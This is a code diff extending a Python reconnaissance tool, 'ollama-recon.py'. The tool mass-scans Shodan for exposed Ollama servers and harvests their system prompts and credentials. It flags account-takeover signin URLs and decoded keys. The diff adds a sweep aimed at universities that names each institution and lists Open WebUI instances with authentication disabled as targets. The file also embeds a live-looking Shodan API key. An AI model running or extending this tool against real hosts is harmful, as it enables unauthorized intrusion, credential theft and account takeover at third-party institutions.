@@ -17,6 +17,8 @@ Usage:
   python3 ollama-recon.py --reprobe        # force reprobe all known-live
   python3 ollama-recon.py --keyhunt        # run cred hunt on all known cloud proxies
   python3 ollama-recon.py --export         # write findings markdown and exit
+  python3 ollama-recon.py --university     # university sweep (org:"university" queries)
+  python3 ollama-recon.py --university --limit 300  # pull more university results
 """
 
 import requests
@@ -25,12 +27,16 @@ import re
 import os
 import base64
 import argparse
+import subprocess
 from datetime import datetime, timezone
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-SHODAN_KEY    = "ZFjLDcJe9Jb5W1iQeZiNrDVu0HyBRSt8"
-STATE_FILE    = os.path.join(os.path.dirname(__file__), "ollama-state.json")
-EXPORT_FILE   = os.path.join(os.path.dirname(__file__), "ollama-findings.md")
+SHODAN_KEY       = "ZFjLDcJe9Jb5W1iQeZiNrDVu0HyBRSt8"
+STATE_FILE       = os.path.join(os.path.dirname(__file__), "ollama-state.json")
+UNIV_STATE_FILE  = os.path.join(os.path.dirname(__file__), "ollama-univ-state.json")
+EXPORT_FILE      = os.path.join(os.path.dirname(__file__), "ollama-findings.md")
+UNIV_EXPORT_FILE = os.path.join(os.path.dirname(__file__), "ollama-univ-findings.md")
+UNIDOMAINS_BIN   = os.path.expanduser("~/university-domains-go/bin/unidomains")
 DEAD_TTL_H    = 48
 LIVE_REPROBE_H = 24
 TIMEOUT_FAST  = 4
@@ -122,18 +128,20 @@ def state_entry(ip, org, hostnames):
         "system_prompts": {},
         "probes": {},
         "cloud_proxy": False,
-        "creds": [],                  # list of {label, value, source}
-        "signin_url": None,           # Ollama Connect signin URL if found
-        "account_takeover": False,    # True if signin_url was exposed
-        "cred_hunted": False,         # True if credential hunt was run
+        "creds": [],
+        "signin_url": None,
+        "account_takeover": False,
+        "cred_hunted": False,
+        "institution": None,          # resolved via university-domains-go
+        "webui": None,                # {present, auth_disabled, version, name}
     }
 
 # ── Shodan ────────────────────────────────────────────────────────────────────
 
-def shodan_ips(limit):
+def shodan_search(query, limit):
     r = requests.get(
         "https://api.shodan.io/shodan/host/search",
-        params={"key": SHODAN_KEY, "query": "port:11434", "limit": limit},
+        params={"key": SHODAN_KEY, "query": query, "limit": limit},
         timeout=10
     )
     data = r.json()
@@ -141,6 +149,66 @@ def shodan_ips(limit):
         (m["ip_str"], m.get("org", ""), m.get("hostnames", []))
         for m in data.get("matches", [])
     ]
+
+def shodan_ips(limit):
+    return shodan_search("port:11434", limit)
+
+def shodan_university_ips(limit):
+    """Pull university-tagged Ollama + Open WebUI instances, deduped by IP."""
+    _, ollama  = shodan_search('http.html:"Ollama is running" org:"university"', limit)
+    _, webui   = shodan_search('http.html:"Open WebUI" port:3000 org:"university"', limit // 2)
+    seen = {}
+    for ip, org, hn in ollama:
+        seen[ip] = (ip, org, hn)
+    for ip, org, hn in webui:
+        if ip not in seen:
+            seen[ip] = (ip, org, hn)
+    total = len(seen)
+    return total, list(seen.values())
+
+# ── University identification ─────────────────────────────────────────────────
+
+def identify_university(hostnames):
+    """Return institution name from unidomains binary, or None."""
+    if not os.path.exists(UNIDOMAINS_BIN):
+        return None
+    for hn in hostnames:
+        parts = hn.split(".")
+        for i in range(len(parts) - 1):
+            domain = ".".join(parts[i:])
+            try:
+                r = subprocess.run(
+                    [UNIDOMAINS_BIN, "-domain-search", domain],
+                    capture_output=True, text=True, timeout=3
+                )
+                if r.returncode == 0 and r.stdout.strip() and r.stdout.strip() != "null":
+                    data = json.loads(r.stdout.strip())
+                    if isinstance(data, list) and data:
+                        u = data[0]
+                        return f"{u.get('name','')} ({u.get('alpha_two_code','')})"
+                    elif isinstance(data, dict) and data.get("name"):
+                        return f"{data['name']} ({data.get('alpha_two_code','')})"
+            except Exception:
+                continue
+    return None
+
+# ── Open WebUI probe ──────────────────────────────────────────────────────────
+
+def probe_webui(ip):
+    """Check port 3000 for Open WebUI with auth disabled."""
+    try:
+        r = requests.get(f"http://{ip}:3000/api/config", timeout=TIMEOUT_FAST)
+        if r.status_code == 200:
+            cfg = r.json()
+            return {
+                "present": True,
+                "auth_disabled": cfg.get("auth", True) is False,
+                "version": cfg.get("version"),
+                "name": cfg.get("name"),
+            }
+    except Exception:
+        pass
+    return {"present": False, "auth_disabled": False}
 
 # ── Ollama HTTP helpers ───────────────────────────────────────────────────────
 
@@ -269,7 +337,7 @@ def run_keyhunt(ip, models):
 
 # ── Core probe ────────────────────────────────────────────────────────────────
 
-def probe_ip(ip, org, hostnames):
+def probe_ip(ip, org, hostnames, university_mode=False):
     tags = get_json(ip, "/api/tags")
     if not tags:
         return None
@@ -296,7 +364,13 @@ def probe_ip(ip, org, hostnames):
         "signin_url": None,
         "account_takeover": False,
         "cred_hunted": False,
+        "institution": None,
+        "webui": None,
     }
+
+    if university_mode:
+        entry["institution"] = identify_university(hostnames)
+        entry["webui"] = probe_webui(ip)
 
     ver = get_json(ip, "/api/version")
     if ver:
@@ -435,14 +509,80 @@ def export_markdown(state):
 
 # ── Main ──────────────────────────────────────────────────────────────────────
 
+def run_scan(state, targets, reprobe, university_mode=False):
+    """Shared probe loop used by both normal and university modes."""
+    to_probe = []
+    skipped_dead = skipped_fresh = 0
+    for ip, org, hn in targets:
+        entry = state.get(ip)
+        if entry:
+            if entry.get("status") == "dead":
+                if hours_since(entry.get("last_probed")) < DEAD_TTL_H and not reprobe:
+                    skipped_dead += 1
+                    continue
+            elif entry.get("status") == "live":
+                if hours_since(entry.get("last_probed")) < LIVE_REPROBE_H and not reprobe:
+                    skipped_fresh += 1
+                    continue
+        to_probe.append((ip, org, hn))
+
+    print(f"[*] Skipped {skipped_dead} recent-dead, {skipped_fresh} fresh-live")
+    print(f"[*] Probing {len(to_probe)} IPs...")
+
+    live_this_run = 0
+    takeover_this_run = []
+
+    with ThreadPoolExecutor(max_workers=20) as ex:
+        futures = {ex.submit(probe_ip, ip, org, hn, university_mode): (ip, org, hn)
+                   for ip, org, hn in to_probe}
+        for f in as_completed(futures):
+            ip, org, hn = futures[f]
+            try:
+                result = f.result()
+                if result:
+                    merge(state, result)
+                    live_this_run += 1
+                    tags = ""
+                    if result["cloud_proxy"]:      tags += " [CLOUD]"
+                    if result["account_takeover"]: tags += " [TAKEOVER!]"
+                    if result["creds"]:            tags += f" [CREDS:{len(result['creds'])}]"
+                    if result.get("webui", {}) and result["webui"].get("auth_disabled"):
+                        tags += " [WEBUI-OPEN]"
+                    sysp = sum(1 for v in result["system_prompts"].values() if v)
+                    inst = f"  {result['institution']}" if result.get("institution") else ""
+                    print(f"  [+] {ip:20s}  {org[:24]:24s}  "
+                          f"v={result['version']}  models={len(result['models'])}"
+                          f"  sys={sysp}{tags}{inst}")
+                    if result["account_takeover"]:
+                        takeover_this_run.append(result)
+                        print(f"  [!!!] SIGNIN URL: {result['signin_url']}")
+                        if result.get("signin_key_decoded"):
+                            print(f"  [!!!] KEY: {result['signin_key_decoded']}")
+                else:
+                    mark_dead(state, ip, org, hn)
+                    print(f"  [-] {ip}")
+            except Exception as e:
+                mark_dead(state, ip, org, hn)
+                print(f"  [!] {ip}: {e}")
+
+    return live_this_run, takeover_this_run
+
+
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument("--limit",    type=int, default=DEFAULT_LIMIT)
-    parser.add_argument("--export",   action="store_true")
-    parser.add_argument("--reprobe",  action="store_true")
-    parser.add_argument("--keyhunt",  action="store_true",
+    parser.add_argument("--limit",      type=int, default=DEFAULT_LIMIT)
+    parser.add_argument("--export",     action="store_true")
+    parser.add_argument("--reprobe",    action="store_true")
+    parser.add_argument("--university", action="store_true",
+                        help="University sweep: org:university Shodan queries + institution ID")
+    parser.add_argument("--keyhunt",    action="store_true",
                         help="Run credential hunt on all known cloud proxies in state")
     args = parser.parse_args()
+
+    if args.university:
+        global STATE_FILE, EXPORT_FILE
+        STATE_FILE  = UNIV_STATE_FILE
+        EXPORT_FILE = UNIV_EXPORT_FILE
 
     state = load_state()
 
@@ -479,63 +619,19 @@ def main():
         return
 
     print(f"[*] Loaded state: {len(state)} known IPs")
-    print(f"[*] Fetching {args.limit} results from Shodan (port:11434)...")
-    total, targets = shodan_ips(args.limit)
-    print(f"[*] Shodan total: {total:,} — got {len(targets)} this batch")
 
-    to_probe = []
-    skipped_dead = 0
-    skipped_fresh = 0
+    if args.university:
+        print(f"[*] University sweep — querying Shodan for org:\"university\" Ollama + Open WebUI...")
+        total, targets = shodan_university_ips(args.limit)
+        print(f"[*] Got {total} unique university IPs this batch")
+    else:
+        print(f"[*] Fetching {args.limit} results from Shodan (port:11434)...")
+        total, targets = shodan_ips(args.limit)
+        print(f"[*] Shodan total: {total:,} — got {len(targets)} this batch")
 
-    for ip, org, hn in targets:
-        entry = state.get(ip)
-        if entry:
-            if entry.get("status") == "dead":
-                if hours_since(entry.get("last_probed")) < DEAD_TTL_H and not args.reprobe:
-                    skipped_dead += 1
-                    continue
-            elif entry.get("status") == "live":
-                if hours_since(entry.get("last_probed")) < LIVE_REPROBE_H and not args.reprobe:
-                    skipped_fresh += 1
-                    continue
-        to_probe.append((ip, org, hn))
-
-    print(f"[*] Skipped {skipped_dead} recent-dead, {skipped_fresh} fresh-live")
-    print(f"[*] Probing {len(to_probe)} IPs...")
-
-    live_this_run = 0
-    takeover_this_run = []
-
-    with ThreadPoolExecutor(max_workers=20) as ex:
-        futures = {ex.submit(probe_ip, ip, org, hn): (ip, org, hn)
-                   for ip, org, hn in to_probe}
-        for f in as_completed(futures):
-            ip, org, hn = futures[f]
-            try:
-                result = f.result()
-                if result:
-                    merge(state, result)
-                    live_this_run += 1
-                    tags = ""
-                    if result["cloud_proxy"]:      tags += " [CLOUD]"
-                    if result["account_takeover"]: tags += " [TAKEOVER!]"
-                    if result["creds"]:            tags += f" [CREDS:{len(result['creds'])}]"
-                    sysp = sum(1 for v in result["system_prompts"].values() if v)
-                    print(f"  [+] {ip:20s}  {org[:28]:28s}  "
-                          f"v={result['version']}  models={len(result['models'])}"
-                          f"  sys={sysp}{tags}")
-                    if result["account_takeover"]:
-                        takeover_this_run.append(result)
-                        print(f"  [!!!] SIGNIN URL: {result['signin_url']}")
-                        if result.get("signin_key_decoded"):
-                            print(f"  [!!!] KEY: {result['signin_key_decoded']}")
-                else:
-                    mark_dead(state, ip, org, hn)
-                    print(f"  [-] {ip}")
-            except Exception as e:
-                mark_dead(state, ip, org, hn)
-                print(f"  [!] {ip}: {e}")
-
+    live_this_run, takeover_this_run = run_scan(
+        state, targets, args.reprobe, university_mode=args.university
+    )
     save_state(state)
 
     all_live     = [e for e in state.values() if e.get("status") == "live"]
@@ -544,6 +640,8 @@ def main():
     all_takeover = [e for e in all_live if e.get("account_takeover")]
     all_sysp     = [e for e in all_live
                     if any(v for v in e.get("system_prompts", {}).values())]
+    all_webui_open = [e for e in all_live
+                      if e.get("webui", {}) and e["webui"].get("auth_disabled")]
 
     print(f"\n{'='*70}")
     print(f"  This run    : {live_this_run} new live  |  {len(takeover_this_run)} takeover(s)")
@@ -551,12 +649,19 @@ def main():
     print(f"  Cloud proxy : {len(all_cloud)}")
     print(f"  Takeover    : {len(all_takeover)}")
     print(f"  Sys prompts : {len(all_sysp)}")
+    if args.university:
+        print(f"  WebUI open  : {len(all_webui_open)}")
     print(f"  State       : {STATE_FILE}")
     print(f"{'='*70}")
     if all_takeover:
         print(f"\n  TAKEOVER TARGETS:")
         for e in all_takeover:
             print(f"    {e['ip']}  {e.get('org','')}  {e.get('signin_url','')[:80]}")
+    if args.university and all_webui_open:
+        print(f"\n  OPEN WEBUI (auth disabled):")
+        for e in all_webui_open:
+            inst = e.get("institution") or e.get("org","")
+            print(f"    {e['ip']}  {inst}")
     print(f"\n  Run --export to write findings markdown")
     print(f"  Run --keyhunt to re-run cred hunt on all cloud proxies")
 
